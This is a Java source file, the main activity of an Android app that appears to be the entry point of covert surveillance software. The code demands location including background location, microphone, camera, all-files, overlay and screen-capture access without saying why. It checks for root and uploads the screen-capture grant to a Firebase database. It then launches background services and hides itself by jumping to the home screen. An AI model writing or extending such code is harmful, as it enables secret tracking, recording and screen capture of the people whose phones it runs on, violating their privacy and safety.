package com.example.foregroundservice;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.app.AppOpsManager;
import android.os.Process;
import android.app.AlertDialog;
import android.content.Context;
import android.os.Environment;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import android.content.ComponentName;
import android.app.role.RoleManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.media.projection.MediaProjectionManager;
import org.json.JSONObject;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.FirebaseDatabase;


public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int SCREEN_CAPTURE_REQUEST_CODE = 1001;
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE
    };

    private static final String[] BACKGROUND_PERMISSIONS = {
        Manifest.permission.ACCESS_BACKGROUND_LOCATION
    };

    private static final String[] BLUETOOTH_PERMISSIONS = {
        Manifest.permission.BLUETOOTH_SCAN,
        Manifest.permission.BLUETOOTH_CONNECT
    };

    private FirebaseAuth mAuth;
    private SharedPreferences prefs;
    private Handler handler = new Handler();
    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final int OVERLAY_PERMISSION_CODE = 124;
    private static final int SCREEN_CAPTURE_CODE = 125;
    private boolean isRooted = false;
    private MediaProjectionManager projectionManager;
    private String userId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        mAuth = FirebaseAuth.getInstance();
        prefs = getSharedPreferences("ServicePrefs", MODE_PRIVATE);
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        
        // Check for root access
        isRooted = checkRootAccess();
        
        // Set up screen mirroring button
        findViewById(R.id.startMirroringButton).setOnClickListener(v -> {
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, SCREEN_CAPTURE_CODE);
        });
        
        if (!prefs.getBoolean("permissions_explained", false)) {
            showPermissionExplanationDialog();
        } else {
            requestAllPermissions();
        }
    }

    private boolean checkRootAccess() {
        String[] rootPaths = {
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su"
        };

        for (String path : rootPaths) {
            if (new File(path).exists()) return true;
        }

        return false;
    }


    private void showPermissionExplanationDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("This app requires several permissions to function properly. Please grant all requested permissions.")
            .setPositiveButton("Continue", (dialog, which) -> {
                prefs.edit().putBoolean("permissions_explained", true).apply();
                requestAllPermissions();
            })
            .setNegativeButton("Exit", (dialog, which) -> finish())
            .setCancelable(false)
            .show();
    }

    private void requestAllPermissions() {
        // First, check if we need special permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                return;
            }
        }

        // Check for MANAGE_EXTERNAL_STORAGE on Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivity(intent);
                return;
            }
        }

        // Check if we need to request app ops permissions
        if (!hasAppOpsPermissions()) {
            openAppSettings();
            return;
        }

        // Request all regular permissions at once
        java.util.List<String> permissionsToRequest = new java.util.ArrayList<>();
        for (String permission : REQUIRED_PERMISSIONS) {
            permissionsToRequest.add(permission);
        }
        
        // Add API level specific permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            for (String permission : BLUETOOTH_PERMISSIONS) {
                permissionsToRequest.add(permission);
            }
        }
        
        ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }

    private boolean hasAppOpsPermissions() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            mode = appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_FINE_LOCATION, 
                Process.myUid(), getPackageName());
        } else {
            mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_FINE_LOCATION, 
                Process.myUid(), getPackageName());
        }
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);
        startActivity(intent);
        
        // Show dialog explaining what to do
        new AlertDialog.Builder(this)
            .setTitle("Additional Permissions Required")
            .setMessage("Please enable all permissions in the Settings screen, then return to the app.")
            .setPositiveButton("OK", null)
            .show();
    }

    private void startScreenCapture() {
        Intent captureIntent = projectionManager.createScreenCaptureIntent();
        startActivityForResult(captureIntent, SCREEN_CAPTURE_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OVERLAY_PERMISSION_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    showPermissionDeniedDialog();
                } else {
                    requestAllPermissions();
                }
            }
        } else if (requestCode == SCREEN_CAPTURE_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                // Store screen capture permission
                try {
                    JSONObject screenData = new JSONObject();
                    screenData.put("resultCode", resultCode);
                    screenData.put("data", data.toUri(0));
                    
                    FirebaseDatabase.getInstance()
                        .getReference("screen_capture_permission")
                        .child(userId)
                        .setValue(screenData.toString())
                        .addOnSuccessListener(aVoid -> {
                            Log.d(TAG, "Screen capture permission saved");
                            startScreenCaptureService(resultCode, data);
                            startService();
                        })
                        .addOnFailureListener(e -> {
                            Log.e(TAG, "Error saving screen capture permission", e);
                            startScreenCaptureService(resultCode, data);
                            startService();
                        });
                } catch (Exception e) {
                    Log.e(TAG, "Error processing screen capture permission", e);
                    startScreenCaptureService(resultCode, data);
                    startService();
                }
            } else {
                startService();
            }
        }
    }

    private void showPermissionDeniedDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("This app requires all permissions to function properly. Would you like to try again?")
            .setPositiveButton("Try Again", (dialog, which) -> requestAllPermissions())
            .setNegativeButton("Exit", (dialog, which) -> finish())
            .setCancelable(false)
            .show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            signInAndStart();
        } else {
            // Some permissions were denied, show settings dialog
            new AlertDialog.Builder(this)
                .setTitle("Permissions Required")
                .setMessage("All permissions are required. Please grant them in Settings.")
                .setPositiveButton("Open Settings", (dialog, which) -> {
                    openAppSettings();
                    handler.postDelayed(this::checkAndProceed, 5000);
                })
                .setNegativeButton("Exit", (dialog, which) -> finish())
                .setCancelable(false)
                .show();
        }
    }

    private void checkAndProceed() {
        if (hasRequiredPermissions()) {
            signInAndStart();
        } else {
            handler.postDelayed(this::checkAndProceed, 1000);
        }
    }

    private boolean hasRequiredPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                return false;
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                return false;
            }
        }

        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        
        // Check API level specific permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            for (String permission : BLUETOOTH_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }

        return true;
    }

    private void signInAndStart() {
        FirebaseUser currentUser = mAuth.getCurrentUser();
        if (currentUser == null) {
            mAuth.signInAnonymously()
                .addOnCompleteListener(this, task -> {
                    if (task.isSuccessful()) {
                        userId = mAuth.getCurrentUser().getUid();
                        startService();
                    } else {
                        Log.e(TAG, "Authentication failed", task.getException());
                        handler.postDelayed(this::signInAndStart, 5000);
                    }
                });
        } else {
            userId = currentUser.getUid();
            startService();
        }
    }
    
    private void startScreenCaptureService(int resultCode, Intent data) {
        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
        serviceIntent.putExtra("resultCode", resultCode);
        serviceIntent.putExtra("data", data);
        startForegroundService(serviceIntent);
        Log.d(TAG, "Starting screen capture service");
    }

    private void startService() {
        Intent serviceIntent = new Intent(this, MyForegroundService.class);
        if (mAuth.getCurrentUser() != null) {
            serviceIntent.putExtra("user_id", mAuth.getCurrentUser().getUid());
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        prefs.edit().putBoolean("service_started", true).apply();
        
        // Minimize app
        Intent startMain = new Intent(Intent.ACTION_MAIN);
        startMain.addCategory(Intent.CATEGORY_HOME);
        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(startMain);
        finish();
    }
}
